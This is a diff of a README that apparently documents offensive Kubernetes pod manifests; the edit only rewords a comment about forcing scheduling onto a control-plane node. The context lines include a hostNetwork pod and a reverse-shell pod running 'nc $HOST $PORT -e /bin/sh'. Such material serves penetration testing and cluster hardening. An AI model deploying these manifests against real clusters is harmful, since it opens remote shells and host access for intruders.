@@ -22,8 +22,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
     name: hostnetwork
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
   ```
 [pod-hostnetwork.yaml](pod-hostnetwork.yaml)
 
@@ -57,8 +56,7 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     name: hostnetwork-revshell
-  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
-  #nodeName: k8s-control-plane-node
+    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
 ```
 [pod-hostnetwork-revshell.yaml](pod-hostnetwork-revshell.yaml)
 
